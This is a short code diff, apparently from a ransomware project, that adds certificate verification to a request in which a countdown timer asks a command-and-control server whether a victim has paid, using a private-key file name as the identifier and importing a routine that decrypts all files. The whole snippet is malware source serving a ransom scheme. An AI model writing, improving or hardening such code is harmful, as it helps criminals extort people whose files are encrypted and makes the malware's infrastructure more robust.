@@ -8,7 +8,7 @@ import requests
 from datetime import datetime, timedelta
 from Crypto.Decrypt import decrypt_all_files
 from Session.Token_Handling import token_check
-from Core.Variables import script_files, seconds_left, password, timer_file_name, c2_server
+from Core.Variables import script_files, seconds_left, password, timer_file_name, c2_server, cert_path
 
 ####################################################################################################################
 
@@ -68,7 +68,7 @@ def timer_window():
         headers, renamed_key, unique_id, unique_uuid = token_check()
 
         try:
-            response = requests.get(c2_server + f"/payment_status/{unique_id}_{unique_uuid}_private.pem", headers=headers)
+            response = requests.get(c2_server + f"/payment_status/{unique_id}_{unique_uuid}_private.pem", headers=headers, verify = cert_path)
             if response.status_code == 200:
                 data = response.json()
                 paid = data.get('paid', False)
